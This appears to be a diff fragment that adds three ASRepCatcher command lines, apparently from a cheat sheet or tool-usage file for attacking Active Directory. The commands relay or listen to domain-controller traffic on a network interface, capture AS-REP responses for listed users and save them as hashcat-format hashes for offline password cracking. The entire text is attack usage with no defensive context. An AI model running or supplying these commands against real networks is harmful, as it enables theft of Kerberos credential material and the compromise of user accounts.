@@ -1,0 +1,3 @@
+ASRepCatcher relay -dc "$DC_IP"
+ASRepCatcher relay -dc "$DC_IP" -iface "$INTERFACE" -tf targets.txt -format hashcat -outfile ASREPHashes.txt -usersfile users.txt
+ASRepCatcher listen -dc "$DC_IP" -iface "$INTERFACE"
